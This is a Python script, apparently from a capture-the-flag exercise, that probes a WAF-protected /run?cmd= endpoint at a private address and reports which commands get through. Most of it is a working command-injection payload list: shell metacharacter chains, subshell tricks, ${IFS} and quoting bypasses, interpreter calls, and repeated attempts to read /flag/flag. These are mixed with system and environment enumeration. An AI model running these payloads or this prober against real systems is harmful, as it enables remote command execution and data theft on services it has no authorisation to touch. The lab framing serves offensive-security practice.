#!/usr/bin/env python3
"""
GateKeeper WAF prober.
Probes GET /run?cmd=... and classifies each payload as ACCEPTED or REJECTED.

Usage:
    python3 probe.py                       # built-in wordlist
    python3 probe.py -f mylist.txt         # one payload per line
    python3 probe.py --url http://host/run
"""

import argparse, sys, time, urllib.parse, requests

BASE = "http://10.110.3.72:8053"
RUN  = BASE + "/run"
# Signature of the WAF rejection page
REJECT_MARKERS = ["not a recognised diagnostic command", ">Rejected<"]

HEADERS = {"User-Agent": "Mozilla/5.0 (probe)"}

# ---------------------------------------------------------------------------
# Built-in payload list — covers common diagnostics + shell metacharacters
# that a blacklist might miss.
# ---------------------------------------------------------------------------
PAYLOADS = [
    # Core utilities likely to be "diagnostic"
    "ls", "ls -la /", "ls -la /app", "ls -la /flag", "ls /flag",
    "cat /app/*.py", "cat /app/*.php", "cat /app/*.txt",
    "pwd", "id", "whoami", "uname", "uname -a", "hostname",
    "date", "uptime", "free", "free -h", "df", "df -h", "du -sh /app",
    "ps", "ps aux", "top -b -n1", "netstat -tulpn", "ss -tulpn",
    "ip addr", "ip a", "ifconfig", "ping -c1 127.0.0.1",
    "env", "printenv", "set", "echo hi", "echo $PATH",
    "file /flag/flag", "stat /flag/flag", "du -a /flag",
    "find / -name 'flag*' 2>/dev/null", "find / -name '*flag*' 2>/dev/null",
    "head -c 200 /flag/flag", "tail -c 200 /flag/flag",
    "sed -n 1p /flag/flag", "awk 1 /flag/flag", "grep . /flag/flag",
    "xxd /flag/flag", "od -c /flag/flag", "strings /flag/flag",
    "tac /flag/flag", "rev /flag/flag", "nl /flag/flag",
    "less /flag/flag", "more /flag/flag",
    "nl /app/*", "tree /app", "lsattr /app",
    "which ls", "which cat", "type ls", "command -v ls",
    "history", "alias", "jobs",
    # Interpreters as a fallback if a shell token slips through
    "sh -c 'id'", "bash -c id", "python3 -c 'print(1)'",
    "php -r 'echo 1;'", "perl -e 'print 1'",
    # Glob-only — useful later to read /flag/* if the app is root-ish
    "ls -la /flag/*", "cat /flag/*",
    # Shell metacharacter probes (WAF blacklist tests)
    "ls;id", "ls|id", "ls&&id", "ls||id", "ls & id",
    "ls\nid", "ls`id`", "ls$(id)", "ls<id", "ls>id",
    "ls;#", "ls #", "ls;/bin/cat /flag/flag",
    "ls/../ls", "l\\s", "l''s", "l\"\"s",
    "l? /", "l* /", "/bin/ls -la /",
    # Diagnostic-like tooling (often whitelisted on "diagnostics" panels)
    "curl --version", "wget --version", "dig --version",
    "nslookup localhost", "getent hosts localhost",
    "systemctl status", "service --status-all",
    "journalctl -n 5", "dmesg | tail",
    "docker ps", "docker ps -a", "podman ps",
    "kubectl get pods", "kubectl version",
    "mysql --version", "psql --version",
    "openssl version", "ssh -V",
    # WAF bypass primitives (encoded forms; the WAF may or may not decode)
    "%69%64", "%2f%62%69%6e%2f%6c%73", "i\\d", "c\\at",
    "cat${IFS}/flag/flag", "cat$IFS/flag/flag",
    "cat${IFS}/fla?/flag", "cat$IFS/flag/./flag",
    "cat/flag/flag", "cat</flag/flag",
]


def classify(body: str) -> str:
    low = body.lower()
    for m in REJECT_MARKERS:
        if m.lower() in low:
            return "REJECTED"
    return "ACCEPTED"


def probe(session: requests.Session, base_run: str, cmd: str, timeout=8) -> dict:
    try:
        r = session.get(base_run, params={"cmd": cmd},
                        headers=HEADERS, timeout=timeout, allow_redirects=True)
        body = r.text
        verdict = classify(body)
        # Short excerpt of the *output* section (the <pre> block if present)
        snippet = ""
        if "<pre>" in body:
            snippet = body.split("<pre>", 1)[1].split("</pre>", 1)[0]
        else:
            snippet = body
        snippet = " ".join(snippet.split())[:160]
        return {"cmd": cmd, "verdict": verdict,
                "code": r.status_code, "snippet": snippet,
                "len": len(body)}
    except Exception as e:
        return {"cmd": cmd, "verdict": "ERROR",
                "code": 0, "snippet": f"{type(e).__name__}: {e}", "len": 0}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=RUN,
                    help=f"endpoint to probe (default: {RUN})")
    ap.add_argument("-f", "--file", help="file with one payload per line")
    ap.add_argument("--delay", type=float, default=0.15,
                    help="seconds between requests (default 0.15)")
    args = ap.parse_args()

    payloads = PAYLOADS
    if args.file:
        with open(args.file) as fh:
            payloads = [ln.rstrip("\n") for ln in fh if ln.strip()]

    s = requests.Session()
    accepted, rejected, errored = [], [], []

    print(f"[*] Probing {args.url}")
    print(f"[*] {len(payloads)} payloads, delay {args.delay}s\n")
    for i, cmd in enumerate(payloads, 1):
        res = probe(s, args.url, cmd)
        status = res["verdict"]
        color = {"ACCEPTED": "\033[92m", "REJECTED": "\033[90m",
                 "ERROR": "\033[91m"}.get(status, "")
        reset = "\033[0m"
        print(f"[{i:>3}/{len(payloads)}] {color}{status:<8}{reset} "
              f"len={res['len']:<5} code={res['code']} "
              f"cmd={cmd!r}")
        if status == "ACCEPTED":
            print(f"           └─ {res['snippet']}")
            accepted.append(res)
        elif status == "REJECTED":
            rejected.append(res)
        else:
            errored.append(res)
        time.sleep(args.delay)

    print("\n" + "=" * 70)
    print(f"ACCEPTED: {len(accepted)}   REJECTED: {len(rejected)}   "
          f"ERROR: {len(errored)}")
    print("=" * 70)
    if accepted:
        print("\n>> Bypass candidates (made it past the WAF):")
        for a in accepted:
            print(f"   - {a['cmd']!r}")
            if a["snippet"]:
                print(f"       {a['snippet']}")
        with open("accepted.txt", "w") as fh:
            for a in accepted:
                fh.write(a["cmd"] + "\n")
        print("\n>> Accepted payloads also written to accepted.txt")


if __name__ == "__main__":
    main()
